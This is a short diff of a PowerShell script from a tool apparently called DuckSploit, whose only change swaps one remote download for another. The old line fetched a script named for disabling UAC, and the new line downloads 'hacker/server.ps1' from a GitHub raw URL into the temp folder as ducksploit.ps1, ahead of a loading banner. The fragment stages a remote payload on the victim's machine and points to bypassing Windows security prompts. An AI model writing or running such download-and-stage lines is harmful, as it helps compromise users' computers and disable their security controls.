@@ -1,4 +1,4 @@
-(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", "%temp%/DuckSploit/ducksploit.ps1")
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/server.ps1", "%temp%/DuckSploit/ducksploit.ps1")
 
 $animation = @"
 Loading DuckSploit $version...
